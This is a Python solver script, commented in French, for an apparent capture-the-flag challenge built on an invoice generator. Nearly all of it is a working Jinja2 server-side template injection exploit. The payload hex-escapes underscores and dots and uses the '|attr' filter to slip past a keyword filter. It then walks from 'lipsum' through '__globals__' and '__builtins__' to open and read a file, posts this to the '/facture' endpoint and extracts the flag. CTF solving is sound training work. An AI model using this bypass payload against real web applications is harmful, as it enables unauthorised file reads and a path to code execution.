#!/usr/bin/env python3
"""Solveur generateur-factures (SSTI Jinja2 avec filtre naif).

Le champ "note" est interpole dans le gabarit -> SSTI. Le filtre rejette les
sous-chaines "__" et "." :
  - "__"  -> echappement \\x5f\\x5f dans les chaines Jinja
  - "."   -> on evite l'operateur point : |attr("...") ; et le point du nom de
             fichier est ecrit \\x2e

Chaine : lipsum (fonction) -> __globals__ -> __builtins__ -> open -> read.
"""
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:1343"

PAYLOAD = (
    r'{{ lipsum|attr("\x5f\x5fglobals\x5f\x5f")'
    r'|attr("get")("\x5f\x5fbuiltins\x5f\x5f")'
    r'|attr("get")("open")("flag\x2etxt")'
    r'|attr("read")() }}'
)


def main():
    data = urllib.parse.urlencode({"note": PAYLOAD}).encode()
    body = urllib.request.urlopen(BASE + "/facture", data=data).read().decode()
    m = re.search(r"FPS\{[^}]+\}", body)
    print(m.group(0) if m else "echec:\n" + body)


if __name__ == "__main__":
    main()
